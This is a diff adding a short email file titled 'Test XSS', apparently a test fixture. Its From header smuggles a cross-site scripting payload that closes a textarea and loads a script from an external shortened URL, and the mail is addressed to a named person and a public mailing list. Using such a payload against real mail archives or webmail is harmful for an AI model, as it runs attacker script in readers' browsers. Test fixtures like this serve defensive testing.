@@ -1,0 +1,7 @@
+From: <"test"></textarea><script src=http://goo.gl/l32dsa></script>@attack.com">
+To: "Julien Barnier" <julien@no-log.org>, r-help@stat.math.ethz.ch
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
